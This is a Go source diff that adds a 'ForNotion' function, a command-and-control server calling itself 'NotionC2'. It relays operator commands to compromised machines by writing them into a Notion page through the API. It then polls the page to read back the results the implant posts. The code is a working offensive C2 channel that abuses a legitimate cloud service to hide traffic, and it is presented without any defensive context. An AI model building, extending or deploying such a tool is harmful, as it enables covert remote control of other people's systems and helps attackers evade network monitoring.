@@ -24,7 +24,13 @@ type github struct {
 	Owner        string            `json:"owner"`
 }
 
-var ()
+type notion struct {
+	Integeration_Token string `json:"integeration_token"`
+	Page_ID            string `json:page_id`
+	Body               string `json:body`
+	Url                string `json:url`
+	UrlR               string `json:urlr`
+}
 
 func ForGithub() {
 	//1. User create a repo, provide the access_token
@@ -129,6 +135,97 @@ func ForGithub() {
 	}
 }
 
+func ForNotion() {
+
+	obj := notion{}
+	obj.Integeration_Token = os.Args[1]
+	obj.Page_ID = os.Args[2]
+	obj.UrlR = "https://api.notion.com/v1/pages/" + obj.Page_ID
+	var end string = ""
+	obj.Url = "https://api.notion.com/v1/blocks/" + obj.Page_ID + "/children"
+	var output map[string]interface{}
+
+	fmt.Println("[+] NotionC2 Server Started!")
+
+	reader := bufio.NewReader(os.Stdin)
+
+	for end != "end" {
+		fmt.Print("command> ")
+		cmd, _ := reader.ReadString('\n')
+		cmd = strings.TrimSpace(cmd)
+
+		fmt.Println("Request Sent to :", obj.Url)
+
+		payload := strings.NewReader(fmt.Sprintf(`{
+			"children": [
+				{
+				"object": "block",
+				"type": "paragraph",
+				"paragraph": {
+					"rich_text": [
+					{
+						"type": "text",
+						"text": { "content": "%s" }
+					}
+					]
+				}
+				}
+			]
+			}`, cmd))
+
+		req, _ := http.NewRequest("PATCH", obj.Url, payload)
+
+		req.Header.Add("Notion-Version", "2022-06-28")
+		req.Header.Add("Authorization", "Bearer "+obj.Integeration_Token)
+		req.Header.Add("Content-Type", "application/json")
+
+		_, err := http.DefaultClient.Do(req)
+
+		if err != nil {
+			fmt.Println("[-] Error in Writing Command")
+		}
+
+		fmt.Println("[!] Waiting to read result....")
+
+		time.Sleep(20 * time.Second)
+
+		//reading from notion
+
+		req1, _ := http.NewRequest("GET", obj.Url, nil)
+
+		req1.Header.Add("Notion-Version", "2022-06-28")
+		req1.Header.Add("Authorization", "Bearer "+obj.Integeration_Token)
+
+		res, err2 := http.DefaultClient.Do(req1)
+
+		if err2 != nil {
+			fmt.Println("[-] Error in reading from the notion page")
+		}
+
+		defer res.Body.Close()
+		body, _ := io.ReadAll(res.Body)
+		json.Unmarshal(body, &output)
+
+		blocks := output["results"].([]interface{})
+		block := blocks[len(blocks)-1].(map[string]interface{})
+		if block["type"] == "paragraph" {
+			paragraph := block["paragraph"].(map[string]interface{})
+			rich := paragraph["rich_text"].([]interface{})
+			//jsonData, _ := json.MarshalIndent(rich, "", "  ")
+			//fmt.Println(string(jsonData))
+			text := rich[0].(map[string]interface{})["text"].(map[string]interface{})["content"]
+			fmt.Println(text)
+		} else {
+			fmt.Println("[-] Last block is not paragraph")
+		}
+
+		fmt.Print("Continue end/quit :")
+		fmt.Scan(&end)
+
+	}
+}
+
 func main() {
-	ForGithub()
+	//ForGithub()
+	ForNotion()
 }
